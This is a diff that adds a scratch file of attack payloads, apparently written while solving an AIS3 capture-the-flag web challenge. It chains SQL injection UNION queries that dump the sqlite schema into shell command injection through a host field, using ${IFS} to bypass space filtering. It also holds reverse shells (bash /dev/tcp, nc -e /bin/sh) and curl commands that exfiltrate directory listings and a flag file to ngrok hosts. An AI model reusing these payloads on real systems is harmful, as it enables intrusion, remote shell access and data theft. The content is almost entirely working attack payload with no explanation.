@@ -1,0 +1,47 @@
+SELECT name FROM sqlite_master WHERE type='table'
+
+SELECT name, host, port FROM challenges WHERE id=1 union select name,sql,tbl_name FROM sqlite_master WHERE type='table' limit 1,1 #
+
+CREATE TABLE sqlite_sequence(name,seq)
+
+SELECT name, host, port FROM challenges WHERE id=1 union select name,seq,3 FROM sqlite_sequence limit 1,1 #
+
+CREATE TABLE "challenges" ("id" INTEGER, "name" TEXT, "host" TEXT, "port" INTEGER, PRIMARY KEY ("id" AUTOINCREMENT))
+
+SELECT name, host, port FROM challenges WHERE id= 1 union select id,host,port FROM challenges limit 0,1 #
+
+
+
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+
+timeout 1 nc -vz 'quiz.ais3.org' 8001 2>&1; curl 'e6aa20cd9088.ngrok.io'; timeout 1 nc -vz 'quiz.ais3.org' $port 2>&1
+
+#quiz.ais3.org 8001
+
+curl e6aa20cd9088.ngrok.io
+timeout 1 nc -vz 'quiz.ais3.org' 8001 2>&1; curl 'e6aa20cd9088.ngrok.io'; timeout 1 nc -vz 'quiz.ais3.org' $port 2>&1
+
+$host = quiz.ais3.org' 8001 2>&1; curl 'e6aa20cd9088.ngrok.io?'; timeout 1 nc -vz 'quiz.ais3.org
+
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+SELECT name, host, port FROM challenges WHERE id= 1 union select name,"quiz.ais3.org' 8001 2>&1; curl 'e6aa20cd9088.ngrok.io'; timeout 1 nc -vz 'quiz.ais3.org",8001 FROM challenges limit 6,1 #
+
+bypass %20
+
+$host = "quiz.ais3.org'${IFS}8001${IFS}2>&1;${IFS}curl${IFS}'e6aa20cd9088.ngrok.io';timeout${IFS}1${IFS}nc${IFS}-vz${IFS}'quiz.ais3.org"
+
+SELECT name, host, port FROM challenges WHERE id= 1 union select name,"quiz.ais3.org'${IFS}8001;${IFS}curl${IFS}'e6aa20cd9088.ngrok.io';timeout${IFS}1${IFS}nc${IFS}-vz${IFS}'quiz.ais3.org",8001 FROM challenges limit 0,1
+
+nc -e /bin/sh 10.0.0.1 4242
+
+$host = quiz.ais3.org' 8001;nc -e /bin/sh 2.tcp.ngrok.io 19835; timeout 1 nc -vz 'quiz.ais3.org
+$host = quiz.ais3.org'${IFS}8001;nc${IFS}-e${IFS}/bin/sh${IFS}2.tcp.ngrok.io${IFS}19835;timeout${IFS}1${IFS}nc${IFS}-vz${IFS}'quiz.ais3.org
+timeout 1 nc -vz '$host' $port 2>&1
+
+SELECT name, host, port FROM challenges WHERE id= 1 union select name,"quiz.ais3.org'${IFS}8001;nc${IFS}-e${IFS}/bin/sh${IFS}2.tcp.ngrok.io${IFS}19835;timeout${IFS}1${IFS}nc${IFS}-vz${IFS}'quiz.ais3.org",8001 FROM challenges limit 0,1
+
+curl https://b91c9752141e.ngrok.io -d $(ls | base64)
+$host = quiz.ais3.org'${IFS}8001;curl${IFS}https://b91c9752141e.ngrok.io${IFS}-d${IFS}$(ls|base64);timeout${IFS}1${IFS}nc${IFS}-vz${IFS}'quiz.ais3.org
+SELECT name, host, port FROM challenges WHERE id= 1 union select name,"quiz.ais3.org'${IFS}8001;curl${IFS}https://b91c9752141e.ngrok.io${IFS}-d${IFS}$(cat${IFS}/flag_81c015863174cd0c14034cc60767c7f5|base64);timeout${IFS}1${IFS}nc${IFS}-vz${IFS}'quiz.ais3.org",8001 FROM challenges limit 0,1
+
